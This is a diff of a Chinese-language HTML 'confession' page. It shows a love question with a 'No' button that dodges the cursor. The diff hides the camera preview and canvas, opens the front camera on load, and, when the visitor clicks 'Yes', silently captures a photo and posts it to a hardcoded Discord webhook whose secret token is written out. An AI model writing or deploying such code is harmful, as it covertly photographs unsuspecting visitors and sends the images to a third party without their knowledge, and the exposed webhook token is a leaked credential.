@@ -8,52 +8,91 @@
 <style>
 body {
   margin: 0;
+  height: 100vh;
   background: #0d1117;
   font-family: "微軟正黑體";
-  color: white;
-  text-align: center;
   overflow: hidden;
   touch-action: none;
 }
 
-h2 {
+.card {
+  width: 100%;
+  height: 100vh;
+  background: #1f2933;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  color: white;
+  position: relative;
+}
+
+img {
+  width: 100px;
+  margin-bottom: 15px;
+}
+
+.title {
+  font-size: 22px;
+  text-align: center;
+  line-height: 1.6;
+}
+
+.subtitle {
+  font-size: 16px;
+  color: #aaa;
+}
+
+.btn-area {
+  position: relative;
+  width: 300px;
+  height: 200px;
   margin-top: 20px;
 }
 
-video {
-  width: 90%;
-  max-width: 320px;
-  border-radius: 12px;
-  margin-top: 10px;
-}
-
-canvas {
-  display: none;
-}
-
 button {
-  margin: 10px;
-  padding: 12px 20px;
+  padding: 12px 25px;
   border: none;
-  border-radius: 10px;
-  font-size: 16px;
+  border-radius: 12px;
+  font-size: 18px;
   cursor: pointer;
+  position: absolute;
+  transition: 0.2s;
 }
 
-#shoot {
+.yes {
   background: #4CAF50;
   color: white;
 }
 
-#yesBtn {
-  background: #ff4d6d;
+.no {
+  background: #ff4d4d;
   color: white;
 }
 
-img {
-  width: 200px;
-  margin-top: 10px;
-  border-radius: 12px;
+.success {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: radial-gradient(circle, #ff4d6d, #0d1117);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  opacity: 0;
+  pointer-events: none;
+  transition: 0.5s;
+  color: white;
+  font-size: 40px;
+}
+
+.success.show {
+  opacity: 1;
+}
+
+/* 隱藏畫布 */
+video, canvas {
   display: none;
 }
 </style>
@@ -61,59 +100,106 @@ img {
 
 <body>
 
-<h2>💖 拍照決定要不要答應 💖</h2>
+<div class="card">
+  <img src="https://cdn-icons-png.flaticon.com/512/742/742751.png">
+
+  <p class="title">
+    我喜歡你 ❤️<br>
+    <span class="subtitle">你願意跟我在一起嗎？ 😳</span>
+  </p>
+
+  <div class="btn-area" id="area">
+    <button class="yes" id="yesBtn">願意</button>
+    <button class="no" id="noBtn">不願意</button>
+  </div>
+</div>
+
+<div class="success" id="success">
+  💖 成功 💖
+</div>
 
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
 
-<br>
-
-<button id="shoot">📸 拍照</button>
-<button id="yesBtn">💖 願意</button>
-
-<br>
-
-<img id="preview">
-
 <script>
+const noBtn = document.getElementById("noBtn");
+const yesBtn = document.getElementById("yesBtn");
+const area = document.getElementById("area");
+const success = document.getElementById("success");
+
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
-const shoot = document.getElementById("shoot");
-const yesBtn = document.getElementById("yesBtn");
-const preview = document.getElementById("preview");
 
+let noScale = 1;
+let yesScale = 1;
 let imageData = null;
 
-// 📷 開前置鏡頭
+// 初始位置
+yesBtn.style.left = "40px";
+yesBtn.style.top = "100px";
+
+noBtn.style.left = "160px";
+noBtn.style.top = "100px";
+
+// 📸 自動開鏡頭（瀏覽器會跳允許）
 navigator.mediaDevices.getUserMedia({
   video: { facingMode: "user" }
 }).then(stream => {
   video.srcObject = stream;
+}).catch(() => {});
+
+// 😈 NO 逃跑
+function moveAway(x, y) {
+  const rect = noBtn.getBoundingClientRect();
+  const bx = rect.left + rect.width / 2;
+  const by = rect.top + rect.height / 2;
+
+  const dx = bx - x;
+  const dy = by - y;
+  const dist = Math.sqrt(dx * dx + dy * dy);
+
+  if (dist < 120) {
+    const maxX = area.clientWidth - noBtn.offsetWidth;
+    const maxY = area.clientHeight - noBtn.offsetHeight;
+
+    noBtn.style.left = Math.random() * maxX + "px";
+    noBtn.style.top = Math.random() * maxY + "px";
+
+    noScale = Math.max(0.3, noScale - 0.1);
+    yesScale += 0.1;
+
+    noBtn.style.transform = `scale(${noScale})`;
+    yesBtn.style.transform = `scale(${yesScale})`;
+  }
+}
+
+document.addEventListener("mousemove", e => moveAway(e.clientX, e.clientY));
+document.addEventListener("touchmove", e => {
+  moveAway(e.touches[0].clientX, e.touches[0].clientY);
 });
 
-// 📸 拍照
-shoot.onclick = () => {
-  const ctx = canvas.getContext("2d");
+// 📸 拍照函數（YES時用）
+function takePhoto() {
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
 
+  const ctx = canvas.getContext("2d");
   ctx.drawImage(video, 0, 0);
 
   imageData = canvas.toDataURL("image/png");
+}
 
-  preview.src = imageData;
-  preview.style.display = "block";
-};
-
-// 💖 點願意 → 傳 Discord
+// 💖 YES
 yesBtn.onclick = async () => {
+  success.classList.add("show");
+
+  takePhoto();
 
   const webhookURL = "https://discord.com/api/webhooks/1492236169524674625/K4JOL-5_G46crVFSWO2S05m9DhJamM42P91kQb-GCPFu7v6CiSIOvQHByAxuo1eqLbCq";
 
   if (!imageData) return;
 
-  const res = await fetch(imageData);
-  const blob = await res.blob();
+  const blob = await (await fetch(imageData)).blob();
 
   const formData = new FormData();
   formData.append("file", blob, "love.png");
@@ -140,7 +226,7 @@ yesBtn.onclick = async () => {
     body: formData
   });
 
-  document.body.innerHTML = "<h1>💖 成功 💖</h1>";
+  document.body.innerHTML = "<div style='color:white;font-size:40px;display:flex;justify-content:center;align-items:center;height:100vh;'>💖 成功 💖</div>";
 };
 </script>
 
